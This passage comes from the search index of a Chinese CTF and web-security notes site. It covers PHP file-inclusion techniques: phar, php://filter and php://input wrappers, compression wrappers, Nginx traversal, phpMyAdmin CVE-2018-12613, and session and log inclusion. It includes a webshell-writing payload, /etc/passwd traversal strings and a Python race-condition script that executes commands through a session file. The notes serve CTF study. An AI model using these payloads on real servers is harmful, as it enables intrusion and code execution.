__HALT_COMPILER();?&gt;\uff1b\nmanifest\n\u538b\u7f29\u6587\u4ef6\u7684\u5c5e\u6027\u7b49\u4fe1\u606f\uff0c\u4ee5/*\u5e8f\u5217\u5316*/\u5b58\u50a8\uff1b\ncontents\n\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9\uff1b\nsignature\n\u7b7e\u540d\uff0c\u653e\u5728\u6587\u4ef6\u672b\u5c3e\uff1b\u8fd9\u91cc\u6709\u4e24\u4e2a\u5173\u952e\u70b9\uff0c\u4e00\u662f\u6587\u4ef6\u6807\u8bc6\uff0c\u5fc5\u987b\u4ee5__HALT_COMPILER();?&gt;\u7ed3\u5c3e\uff0c\u4f46\u524d\u9762\u7684\u5185\u5bb9\u6ca1\u6709\u9650\u5236\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u8f7b\u6613\u4f2a\u9020\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u6216\u8005pdf\u6587\u4ef6\u6765\u7ed5\u8fc7\u4e00\u4e9b\u4e0a\u4f20\u9650\u5236\uff1b\u4e8c\u662f\u53cd\u5e8f\u5217\u5316\uff0cphar\u5b58\u50a8\u7684meta-data\u4fe1\u606f\u4ee5\u5e8f\u5217\u5316\u65b9\u5f0f\u5b58\u50a8\uff0c\u5f53\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u901a\u8fc7phar://\u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\u5c31\u4f1a\u5c06\u6570\u636e\u53cd\u5e8f\u5217\u5316\uff0c\u800c\u8fd9\u6837\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u6709\u5f88\u591a\u3002\nPlain Text\n</code></pre> <p>\u4f8b\u9898\uff1a</p> <p>[CISCN2019 \u534e\u5317\u8d5b\u533a Day1 Web1]Dropbox</p>"},{"location":"web/include/include_normal/#php","title":"php://\u4f2a\u534f\u8bae","text":"<p>php://input,\u7528\u4e8e\u6267\u884cphp\u4ee3\u7801\uff0c\u9700\u8981post\u8bf7\u6c42\u63d0\u4ea4\u6570\u636e\u3002</p>"},{"location":"web/include/include_normal/#phpfilter","title":"php://filter","text":"<p>php://filter\u662f\u4e00\u79cd\u5143\u5c01\u88c5\u5668\uff0c\u7528\u4e8e\u6570\u636e\u6d41\u6253\u5f00\u65f6\u7b5b\u9009\u8fc7\u6ee4\u5e94\u7528\u3002\u8fd9\u5bf9\u4e8e\u4e00\u4f53\u5f0f\uff08all-in-one\uff09\u7684\u6587\u4ef6\u51fd\u6570\u975e\u5e38\u6709\u7528\u3002\u7c7b\u4f3creadfile()\u3001file()\u3001file_get_contents(),\u5728\u6570\u636e\u6d41\u8bfb\u53d6\u4e4b\u524d\u6ca1\u6709\u673a\u4f1a\u4f7f\u7528\u5176\u4ed6\u8fc7\u6ee4\u5668\u3002</p> <p>\u7528\u4e8e\u8bfb\u53d6\u6e90\u7801\uff0cget\u63d0\u4ea4\u53c2\u6570\u3002a=php://filter/read=convert.base64/resource=xxx.php</p> <p>\u9700\u8981\u5f00\u542fallow_url_fopen:php://input\u3001php://stdin\u3001php://memory\u3001php://temp</p> <p>\u4e0d\u9700\u8981\u5f00\u542fallow_url_fopen:php://filter</p> <p>php://filter\u53c2\u6570</p> <p>\u540d\u79f0  \u63cf\u8ff0</p> <p>resource=&lt;\u8981\u8fc7\u6ee4\u7684\u6570\u636e\u6d41&gt;  \u8fd9\u4e2a\u53c2\u6570\u662f\u5fc5\u987b\u7684\u3002\u5b83\u6307\u5b9a\u4e86\u4f60\u8981\u7b5b\u9009\u8fc7\u6ee4\u7684\u6570\u636e\u6d41\u3002</p> <p>read=&lt;\u8bfb\u94fe\u7684\u7b5b\u9009\u5217\u8868&gt;  \u8be5\u53c2\u6570\u53ef\u9009\u3002\u53ef\u4ee5\u8bbe\u5b9a\u4e00\u4e2a\u6216\u591a\u4e2a\u8fc7\u6ee4\u5668\u540d\u79f0\uff0c\u4ee5\u7ba1\u9053\u7b26(</p> <p>write=&lt;\u5199\u94fe\u7684\u7b5b\u9009\u5217\u8868&gt; \u8be5\u53c2\u6570\u53ef\u9009\u3002\u53ef\u4ee5\u8bbe\u5b9a\u4e00\u4e2a\u6216\u591a\u4e2a\u8fc7\u6ee4\u5668\u540d\u79f0\uff0c\u4ee5\u7ba1\u9053\u7b26(</p> <p>&lt;\uff1b\u4e24\u4e2a\u94fe\u7684\u7b5b\u9009\u5217\u8868&gt; \u4efb\u4f55\u6ca1\u6709\u4ee5 read= \u6216 write= \u4f5c\u524d\u7f00 \u7684\u7b5b\u9009\u5668\u5217\u8868\u4f1a\u89c6\u60c5\u51b5\u5e94\u7528\u4e8e\u8bfb\u6216\u5199\u94fe\u3002</p> <p>\u9996\u5148\u8fd9\u662f\u4e00\u4e2afile\u5173\u952e\u5b57\u7684get\u53c2\u6570\u4f20\u9012\uff0cphp://\u662f\u4e00\u79cd\u534f\u8bae\u540d\u79f0\uff0cphp://filter/\u662f\u4e00\u79cd\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7684\u534f\u8bae\uff0c/read=convert.base64-encode/\u8868\u793a\u8bfb\u53d6\u7684\u65b9\u5f0f\u662fbase64\u7f16\u7801\u540e\uff0cresource=index.php\u8868\u793a\u76ee\u6807\u6587\u4ef6\u4e3aindex.php\u3002</p> <p>\u901a\u8fc7\u4f20\u9012\u8fd9\u4e2a\u53c2\u6570\u53ef\u4ee5\u5f97\u5230index.php\u7684\u6e90\u7801\uff0c\u4e0b\u9762\u8bf4\u8bf4\u4e3a\u4ec0\u4e48\uff0c\u770b\u5230\u6e90\u7801\u4e2d\u7684include\u51fd\u6570\uff0c\u8fd9\u4e2a\u8868\u793a\u4ece\u5916\u90e8\u5f15\u5165php\u6587\u4ef6\u5e76\u6267\u884c\uff0c\u5982\u679c\u6267\u884c\u4e0d\u6210\u529f\uff0c\u5c31\u8fd4\u56de\u6587\u4ef6\u7684\u6e90\u7801\u3002</p> <p>\u800cinclude\u7684\u5185\u5bb9\u662f\u7531\u7528\u6237\u63a7\u5236\u7684\uff0c\u6240\u4ee5\u901a\u8fc7\u6211\u4eec\u4f20\u9012\u7684file\u53c2\u6570\uff0c\u662finclude\uff08\uff09\u51fd\u6570\u5f15\u5165\u4e86index.php\u7684base64\u7f16\u7801\u683c\u5f0f\uff0c\u56e0\u4e3a\u662fbase64\u7f16\u7801\u683c\u5f0f\uff0c\u6240\u4ee5\u6267\u884c\u4e0d\u6210\u529f\uff0c\u8fd4\u56de\u6e90\u7801\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u4e86\u6e90\u7801\u7684base64\u683c\u5f0f\uff0c\u89e3\u7801\u5373\u53ef\u3002</p> <p>\u5982\u679c\u4e0d\u8fdb\u884cbase64\u7f16\u7801\u4f20\u5165\uff0c\u5c31\u4f1a\u76f4\u63a5\u6267\u884c\uff0c\u800cflag\u7684\u4fe1\u606f\u5728\u6ce8\u91ca\u4e2d\uff0c\u662f\u5f97\u4e0d\u5230\u7684\u3002</p>"},{"location":"web/include/include_normal/#_7","title":"\u793a\u4f8b\uff1a","text":"<pre><code>php://filter/read=convert.base64-encode/resource=[\u6587\u4ef6\u540d]\u8bfb\u53d6\u6587\u4ef6\u6e90\u7801\uff08\u9488\u5bf9php\u6587\u4ef6\u9700\u8981base64\u7f16\u7801\uff09http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php\nPlain Text\n</code></pre> <pre><code>php://input + [POST DATA]\u6267\u884cphp\u4ee3\u7801http://127.0.0.1/include.php?file=php://input[POST DATA\u90e8\u5206]&lt;?php phpinfo(); ?&gt;\nPlain Text\n</code></pre> <p>\u82e5\u6709\u5199\u5165\u6743\u9650\uff0c\u5199\u5165\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <pre><code>http://127.0.0.1/include.php?file=php://input[POST DATA\u90e8\u5206]&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;\nPlain Text\n</code></pre> <p></p> <p>\u603b\u4e4b\u5c31\u4e00\u4e2a\u4ee3\u7801\u6267\u884c\uff0c\u4e00\u4e2a\u5229\u7528\u6570\u636e\u6d41\u8bfb\u53d6\u6e90\u4ee3\u7801</p> <p>#####################################################################</p> <p>\u5173\u4e8efile_put_contents\u7684\u4e00\u4e9b\u5c0f\u6d4b\u8bd5</p> <p>\u6628\u5929\u770b\u4e86\u7bc7\u6587\u7ae0\u4e00\u6b21\u201cSSRF\u2013&gt;RCE\u201d\u7684\u8270\u96be\u5229\u7528\uff0c\u88ab\u91cc\u9762\u7684\u5404\u79cd\u9a9a\u64cd\u4f5c\u7ed9\u79c0\u5230\u4e86\uff0c\u53d1\u73b0file_put_contents\u8fd9\u4e2a\u5f88\u6709\u610f\u601d\uff0c\u7ed5\u8fc7&lt;?php exit();GetShell\u4e5f\u7ecf\u5e38\u6709\u4eba\u63d0\u51fa\u4e0d\u540c\u7684\u601d\u8def\uff0c\u8fd9\u91cc\u7b80\u5355\u7684\u505a\u4e00\u4e0b\u6d4b\u8bd5\u548c\u8bb0\u5f55\u3002 file_put_contents(filename,\u201d&lt;?php exit();\u201d.content);</p> <p>https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</p>"},{"location":"web/include/include_normal/#zip-bzip2-zlib","title":"zip:// &amp; bzip2:// &amp; zlib:// \u534f\u8bae","text":"<p>\u6761\u4ef6\uff1a</p> <ul> <li> <p><code>allow_url_fopen</code>:off/on</p> </li> <li> <p><code>allow_url_include</code>:off/on</p> </li> <li> <p>\u4f5c\u7528\uff1a<code>zip:// &amp; bzip2:// &amp; zlib://</code>\u5747\u5c5e\u4e8e\u538b\u7f29\u6d41\uff0c\u53ef\u4ee5\u8bbf\u95ee\u538b\u7f29\u6587\u4ef6\u4e2d\u7684\u5b50\u6587\u4ef6\uff0c\u66f4\u91cd\u8981\u7684\u662f\u4e0d\u9700\u8981\u6307\u5b9a\u540e\u7f00\u540d\uff0c\u53ef\u4fee\u6539\u4e3a\u4efb\u610f\u540e\u7f00\uff1a<code>jpg png gif xxx</code>\u7b49\u7b49\u3002</p> </li> <li> <p>\u793a\u4f8b\uff1a</p> </li> </ul> <pre><code>zip://[\u538b\u7f29\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84]%23[\u538b\u7f29\u6587\u4ef6\u5185\u7684\u5b50\u6587\u4ef6\u540d]\uff08#\u7f16\u7801\u4e3a%23\uff09\u538b\u7f29 phpinfo.txt \u4e3a phpinfo.zip \uff0c\u538b\u7f29\u5305\u91cd\u547d\u540d\u4e3a phpinfo.jpg \uff0c\u5e76\u4e0a\u4f20http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt\nPlain Text\n</code></pre> <p></p> <pre><code>compress.bzip2://file.bz2\n\u538b\u7f29 phpinfo.txt \u4e3a phpinfo.bz2 \u5e76\u4e0a\u4f20\uff08\u540c\u6837\u652f\u6301\u4efb\u610f\u540e\u7f00\u540d\uff09\nhttp://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2\nPlain Text\n</code></pre> <p></p> <pre><code>compress.zlib://file.gz\n\u538b\u7f29 phpinfo.txt \u4e3a phpinfo.gz \u5e76\u4e0a\u4f20\uff08\u540c\u6837\u652f\u6301\u4efb\u610f\u540e\u7f00\u540d\uff09\nhttp://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz\nPlain Text\n</code></pre> <p></p>"},{"location":"web/include/include_pro/","title":"include\u8fdb\u9636","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/include/include_pro/#nginx","title":"Nginx\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e","text":"<p>Nginx (engine x) \u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\u7684HTTP\u548c\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u4e5f\u662f\u4e00\u4e2aIMAP/POP3/SMTP\u670d\u52a1\u5668\u3002Nginx\u7ecf\u5e38\u88ab\u505a\u4e3a\u53cd\u5411\u4ee3\u7406\uff0c\u52a8\u6001\u7684\u90e8\u5206\u88abproxy_pass\u4f20\u9012\u7ed9\u540e\u7aef\u7aef\u53e3\uff0c\u800c\u9759\u6001\u6587\u4ef6\u9700\u8981Nginx\u6765\u5904\u7406\u3002</p> <p>payload\u5982\u4e0b</p> <pre><code>upload/../../../../../tmp/shell.php\nPlain Text\n</code></pre> <p>\u81f3\u4e8e\u539f\u7406\uff0c\u770b\u770b\u5c31\u80fd\u5f88\u5feb\u7406\u89e3\uff1a</p> <p>NGINX-\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e_\u662f\u5927\u65b9\u5b50-CSDN\u535a\u5ba2_\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e</p> <p>\u590d\u73b0\u73af\u5883centos7dockervulhub\uff08git\uff09\u590d\u73b0\u8fc7\u7a0b\u8fdb\u5165/root/vulhub/nginx/insecure-configuration\u76ee\u5f55\u8f93\u5165docker compose up -d \u5f00\u542f\u5bb9\u5668\u8bbf\u95ee\u4e0bfiles\u5728files\u540e\u9762\u52a0\u4e0a..\u53ef\u7a7f\u8d8a\u5230\u4e0a\u7ea7\u76ee\u5f55\u5bfc\u81f4\u6f0f\u6d1e\u7684\u539f\u56e0\uff0curl\u4e0a/files\u6ca1\u6709\u52a0\u540e\u7f00/\uff0c\u800cali...</p> <p>https://blog.csdn.net/nzjdsds/article/details/97624122</p>"},{"location":"web/include/include_pro/#cve-2018-12613","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1eCVE-2018-12613","text":"<p>\u8fd9\u4e2a\u6211\u4e5f\u76f4\u63a5copy\u4e0b\u6765\u4e86\uff0c\u6211\u6ca1\u9047\u89c1\u8fc7\uff0c\u590d\u73b0\u7684\u8bdd\u65f6\u95f4\u4e0d\u592a\u591f\u3002</p> <p>phpMyAdmin 4.8.1 \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff08CVE-2018-12613\uff09_GGyao\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <p>0x01 \u7b80\u4ecbphpMyadmin 4.8.1\u7248\u672c\u7684index.php\u4e2d\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u901a\u8fc7\u4e8c\u6b21\u7f16\u7801\u53ef\u7ed5\u8fc7\u8fc7\u6ee4\u30020x02 \u6f0f\u6d1e\u590d\u73b01.\u5c06?\u8fdb\u884c\u4e24\u6b21URL\u7f16\u7801\u4e3a&amp;quot;%253f&amp;quot;\uff0c\u6784\u9020\u4e0b\u5217payload\uff1ahttp://xxx:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd\u6f0f\u6d1e\u5b58\u5728\u30022.\u5728S...</p> <p>https://blog.csdn.net/lhh134/article/details/86539066</p> <p>phpMyadmin 4.8.1\u7248\u672c\u7684index.php\u4e2d\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u901a\u8fc7\u4e8c\u6b21\u7f16\u7801\u53ef\u7ed5\u8fc7\u8fc7\u6ee4\u3002</p> <p>\u5229\u7528\u8fc7\u7a0b\u5c31\u662f\u5c06\u95ee\u53f7\u7f16\u7801\u6210</p> <pre><code>%253f\nPlain Text\n</code></pre> <p>\u53ef\u4ee5\u7ed5\u8fc7phpmyadmin\u91cc\u9762\u7684\u8fc7\u6ee4\u51fd\u6570</p> <p>\u81f3\u4e8e\u6f0f\u6d1e\u7684\u539f\u7406\uff1a</p> <p>phpmyadmin 4.8.1 \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff08CVE-2018-12613\uff09 - \u6dda\u7b11 - \u535a\u5ba2\u56ed</p> <p>\u6f0f\u6d1e\u8be6\u60c5 \u8303\u56f4 phpMyAdmin 4.8.0\u548c4.8.1 \u539f\u7406 \u9996\u5148\u5728index.php 50 63\u884c\u4ee3\u7801 \u6ee1\u8db35\u4e2a\u6761\u4ef6\u540e\u5c31\u4f1ainclude \u7684\u5185\u5bb9 \u4e0d\u4e3a\u7a7a \u662f\u5b57\u7b26\u4e32 \u4e0d\u4ee5index\u5f00\u5934 \u4e0d\u5728$t</p> <p>https://www.cnblogs.com/leixiao-/p/10265150.html#autoid-0-0-0</p>"},{"location":"web/include/include_pro/#session","title":"session\u6587\u4ef6\u5305\u542b","text":"<p>\u8bb0\u5f97\u4e4b\u524d\u53cd\u5e8f\u5217\u5316\u91cc\u9762session\u53cd\u5e8f\u5217\u5316\u7684\u5185\u5bb9</p> <p>\u8fd9\u91cc\u6240\u7528\u5230\u7684\u4e1c\u897f\u548c\u90a3\u4e2a\u4e00\u6837</p> <p>\u5229\u7528session.upload_progress\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u5229\u7528</p> <p>\u4ee5\u4e0b\u6765\u81ea</p> <p>\u5229\u7528session.upload_progress\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u548c\u53cd\u5e8f\u5217\u5316\u6e17\u900f - FreeBuf\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u95e8\u6237</p> <p>\u672c\u6587\u4e3b\u8981\u662f\u5229\u7528PHP\u4e2d\u7684session.upload_progress\u529f\u80fd\u4f5c\u4e3a\u8df3\u677f\uff0c\u4ece\u800c\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u548c\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u3002</p> <p>https://www.freebuf.com/news/202819.html</p>"},{"location":"web/include/include_pro/#_1","title":"\u6d4b\u8bd5\u73af\u5883","text":"<p>php5.5.38win10\u5173\u4e8esession\u76f8\u5173\u7684\u4e00\u5207\u914d\u7f6e\u90fd\u662f\u9ed8\u8ba4\u503c</p>"},{"location":"web/include/include_pro/#_2","title":"\u793a\u4f8b\u4ee3\u7801","text":"<pre><code>&lt;?php$b=$_GET['file'];include \"$b\";?&gt;\nPlain Text\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\uff0c\u5b58\u5728\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u4f46\u662f\u627e\u4e0d\u5230\u4e00\u4e2a\u53ef\u4ee5\u5305\u542b\u7684\u6076\u610f\u6587\u4ef6\u3002\u5176\u5b9e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528<code>session.upload_progress</code>\u5c06\u6076\u610f\u8bed\u53e5\u5199\u5165session\u6587\u4ef6\uff0c\u4ece\u800c\u5305\u542bsession\u6587\u4ef6\u3002\u524d\u63d0\u9700\u8981\u77e5\u9053session\u6587\u4ef6\u7684\u5b58\u653e\u4f4d\u7f6e\u3002</p>"},{"location":"web/include/include_pro/#_3","title":"\u5206\u6790","text":"<p>\u95ee\u9898\u4e00</p> <p>\u4ee3\u7801\u91cc\u6ca1\u6709<code>session_start()</code>,\u5982\u4f55\u521b\u5efasession\u6587\u4ef6\u5462\u3002</p> <p>\u89e3\u7b54\u4e00</p> <p>\u5176\u5b9e\uff0c\u5982\u679c<code>session.auto_start=On</code>\uff0c\u5219PHP\u5728\u63a5\u6536\u8bf7\u6c42\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u521d\u59cb\u5316Session\uff0c\u4e0d\u518d\u9700\u8981\u6267\u884csession_start()\u3002\u4f46\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u9009\u9879\u90fd\u662f\u5173\u95ed\u7684\u3002</p> <p>\u4f46session\u8fd8\u6709\u4e00\u4e2a\u9ed8\u8ba4\u9009\u9879\uff0csession.use_strict_mode\u9ed8\u8ba4\u503c\u4e3a0\u3002\u6b64\u65f6\u7528\u6237\u662f\u53ef\u4ee5\u81ea\u5df1\u5b9a\u4e49Session ID\u7684\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u5728Cookie\u91cc\u8bbe\u7f6ePHPSESSID=TGAO\uff0cPHP\u5c06\u4f1a\u5728\u670d\u52a1\u5668\u4e0a\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff1a/tmp/sess_TGAO\u201d\u3002\u5373\u4f7f\u6b64\u65f6\u7528\u6237\u6ca1\u6709\u521d\u59cb\u5316Session\uff0cPHP\u4e5f\u4f1a\u81ea\u52a8\u521d\u59cb\u5316Session\u3002 \u5e76\u4ea7\u751f\u4e00\u4e2a\u952e\u503c\uff0c\u8fd9\u4e2a\u952e\u503c\u6709ini.get(\"session.upload_progress.prefix\")+\u7531\u6211\u4eec\u6784\u9020\u7684session.upload_progress.name\u503c\u7ec4\u6210\uff0c\u6700\u540e\u88ab\u5199\u5165sess_\u6587\u4ef6\u91cc\u3002</p> <p>\u95ee\u9898\u4e8c</p> <p>\u4f46\u662f\u95ee\u9898\u6765\u4e86\uff0c\u9ed8\u8ba4\u914d\u7f6e<code>session.upload_progress.cleanup = on</code>\u5bfc\u81f4\u6587\u4ef6\u4e0a\u4f20\u540e\uff0csession\u6587\u4ef6\u5185\u5bb9\u7acb\u5373\u6e05\u7a7a\uff0c</p> <p>\u5982\u4f55\u8fdb\u884crce\u5462\uff1f</p> <p>\u89e3\u7b54\u4e8c</p> <p>\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u7ade\u4e89\uff0c\u5728session\u6587\u4ef6\u5185\u5bb9\u6e05\u7a7a\u524d\u8fdb\u884c\u5305\u542b\u5229\u7528\u3002</p>"},{"location":"web/include/include_pro/#_4","title":"\u5229\u7528\u811a\u672c","text":"<pre><code>#coding=utf-8\u200bimport ioimport requestsimport threadingsessid = 'TGAO'data = {\"cmd\":\"system('whoami');\"}def write(session):    while True:        f = io.BytesIO(b'a' * 1024 * 50)        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[\"cmd\"]);?&gt;'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )def read(session):    while True:        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)        if 'tgao.txt' in resp.text:            print(resp.text)            event.clear()        else:            print(\"[+++++++++++++]retry\")if __name__==\"__main__\":    event=threading.Event()    with requests.session() as session:        for i in xrange(1,30):             threading.Thread(target=write,args=(session,)).start()\u200b        for i in xrange(1,30):            threading.Thread(target=read,args=(session,)).start()    event.set()\nPlain Text\n</code></pre> <p>\u6548\u679c\u5982\u4e0b\u56fe</p> <p></p>"},{"location":"web/include/include_pro/#_5","title":"\u65e5\u5fd7\u5305\u542b","text":"<p>\u5728\u6211\u7684\u5370\u8c61\u4e2d\u662f\u6709\u8fd9\u6837\u7684\u64cd\u4f5c\u7684\uff0c\u800c\u4e14\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u65e5\u5fd7\u6587\u4ef6\u8fbe\u5230\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u4f5c\u7528\u3002</p>"},{"location":"web/include/include_pro/#apache2","title":"apache2","text":"<p>\u4ee5ubuntu\u4e0bapache2\u4e3a\u4f8b\uff0c\u5148\u8bf7\u6c42<code>/&lt;?php phpinfo();?&gt;</code>\uff0c\u7136\u540e\u5305\u542b/var/log/apache2/access.log\u5373\u53ef</p>"},{"location":"web/include/include_pro/#mail","title":"mail","text":"<p>/var/log/mail.log</p> <p>\u81f3\u4e8e\u53c2\u8003</p> <p>\u5b89\u6052\u676f6\u6708\u8d5bweb2 easypentest | JrXnm' blog</p> <p>https://blog.szfszf.top/tech/%E5%AE%89%E6%81%92%E6%9D%AF6%E6%9C%88%E8%B5%9B-easypentest/</p> <p>\u5df2\u7ecf\u6e17\u900f\u8fdb\u5185\u7f51</p>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/","title":"LD_PRELOAD\u51fd\u6570\u52ab\u6301","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u8fd9\u4e2a\u6f0f\u6d1e\u6211\u95ee\u8fc7\u5353\u817e\u9f99\u5b66\u957f</p> <p>\u5982\u679c\u6709\u4e0d\u4f1a\u7684\uff0c\u770b\u4e0d\u61c2\u7684\u53ef\u4ee5\u53bb\u95ee\u4ed6</p> <p>\u8fd9\u91cc\u7684\u5185\u5bb9\u4f1a\u7275\u626f\u5230\u4e00\u4e9blinux\u5185\u6838\uff0c\u5904\u7406\u673a\u5236\u76f8\u5173\u7684\u77e5\u8bc6</p> <p>\u5c31\u7b97\u5b9e\u5728\u4e0d\u4f1a\u5229\u7528\u7684\uff0c\u6211\u4e5f\u7ed9\u51fa\u4e86\u4e00\u79cd\u76f8\u5bf9\u7b80\u5355\u7684\u65b9\u6cd5</p> <p>\u4e0b\u9762\u662f\u9884\u5907\u77e5\u8bc6</p>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#_1","title":"LD_PRELOAD\u51fd\u6570\u52ab\u6301","text":"<p>LD_PRELOAD\u4f7f\u7528\u9650\u5236</p> <p>\u8fd9\u79cd\u65b9\u5f0f\u867d\u7136\u5f88\u9177\uff0c\u4f46\u5374\u6709\u4e00\u4e9b\u9650\u5236\u3002\u6bd4\u5982\u5bf9\u4e8e\u9759\u6001\u7f16\u8bd1\u7684\u7a0b\u5e8f\u662f\u65e0\u6548\u7684\u3002\u56e0\u4e3a\u9759\u6001\u7f16\u8bd1\u7684\u7a0b\u5e8f\u4e0d\u9700\u8981\u8fde\u63a5\u52a8\u6001\u5e93\u7684\u9762\u7684\u51fd\u6570\u3002\u800c\u4e14\uff0c\u5047\u5982\u6587\u4ef6\u7684SUID\u6216SGID\u4f4d\u88ab\u7f6e1\uff0c\u52a0\u8f7d\u7684\u65f6\u5019\u4f1a\u5ffd\u7565LD_PRELOAD(\u8fd9\u662fld\u7684\u5f00\u53d1\u8005\u51fa\u4e8e\u5b89\u5168\u8003\u8651\u505a\u7684)\u3002</p>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#_2","title":"LD_PRELOAD\u51fd\u6570\u52ab\u6301","text":""},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#linux","title":"\u9996\u5148\u7ed9\u51falinux\u7a0b\u5e8f\u7684\u4e09\u79cd\u94fe\u63a5","text":"<pre><code>\u9759\u6001\u94fe\u63a5\uff1a\u5728\u7a0b\u5e8f\u8fd0\u884c\u4e4b\u524d\u5148\u5c06\u5404\u4e2a\u76ee\u6807\u6a21\u5757\u4ee5\u53ca\u6240\u9700\u8981\u7684\u5e93\u51fd\u6570\u94fe\u63a5\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u4e4b\u540e\u4e0d\u518d\u62c6\u5f00\u3002\n\u88c5\u5165\u65f6\u52a8\u6001\u94fe\u63a5\uff1a\u6e90\u7a0b\u5e8f\u7f16\u8bd1\u540e\u6240\u5f97\u5230\u7684\u4e00\u7ec4\u76ee\u6807\u6a21\u5757\uff0c\u5728\u88c5\u5165\u5185\u5b58\u65f6\uff0c\u8fb9\u88c5\u5165\u8fb9\u94fe\u63a5\u3002\n\u8fd0\u884c\u65f6\u52a8\u6001\u94fe\u63a5\uff1a\u539f\u7a0b\u5e8f\u7f16\u8bd1\u540e\u5f97\u5230\u7684\u76ee\u6807\u6a21\u5757\uff0c\u5728\u7a0b\u5e8f\u6267\u884c\u8fc7\u7a0b\u4e2d\u9700\u8981\u7528\u5230\u65f6\u624d\u5bf9\u5b83\u8fdb\u884c\u94fe\u63a5\nPlain Text\n</code></pre> <p>\u5bf9\u4e8e\u52a8\u6001\u94fe\u63a5\u6765\u8bf4\uff0c\u9700\u8981\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5176\u4f5c\u7528\u5728\u4e8e\u5f53\u52a8\u6001\u5e93\u4e2d\u7684\u51fd\u6570\u53d1\u751f\u53d8\u5316\u5bf9\u4e8e\u53ef\u6267\u884c\u7a0b\u5e8f\u6765\u8bf4\u65f6\u900f\u660e\u7684\uff0c\u53ef\u6267\u884c\u7a0b\u5e8f\u65e0\u9700\u91cd\u65b0\u7f16\u8bd1\uff0c\u65b9\u4fbf\u7a0b\u5e8f\u7684\u53d1\u5e03/\u7ef4\u62a4/\u66f4\u65b0\u3002\u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u662f\u5728\u8fd0\u884c\u65f6\u52a8\u6001\u52a0\u8f7d\uff0c\u8fd9\u5c31\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff0c\u5047\u5982\u7a0b\u5e8f\u52a8\u6001\u52a0\u8f7d\u7684\u51fd\u6570\u662f\u6076\u610f\u7684\uff0c\u5c31\u6709\u53ef\u80fd\u5bfc\u81f4disable_function\u88ab\u7ed5\u8fc7\u3002(\u8fd9\u91cc\u7684disable_function\u5c31\u662f\u7cfb\u7edf\u6240\u8fc7\u6ee4\u7684\u51fd\u6570\u3002)</p>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#ld_preload_1","title":"